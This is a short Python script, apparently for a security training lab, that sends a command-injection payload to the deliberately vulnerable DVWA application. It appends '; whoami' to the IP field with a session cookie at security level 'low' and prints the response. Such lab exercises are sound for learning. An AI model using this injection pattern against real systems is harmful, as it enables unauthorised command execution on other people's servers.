import requests

def run_command_injection(dvwa_url, dvwa_session_cookie):
    # URL for the Command Injection vulnerability
    target_url = f"{dvwa_url}"

    # Headers for the request (including PHP session ID)
    headers = {
        'Cookie': f'PHPSESSID={dvwa_session_cookie}; security=low'
    }

    # Command injection payload
    # Example: appending `; whoami` to execute an additional command
    payload = {
        'ip': '127.0.0.1; whoami',
        'Submit': 'Submit'
    }

    # Sending the POST request with the payload
    response = requests.post(target_url, data=payload, headers=headers)

    # Print the response to see if the command injection was successful
    print(response.text)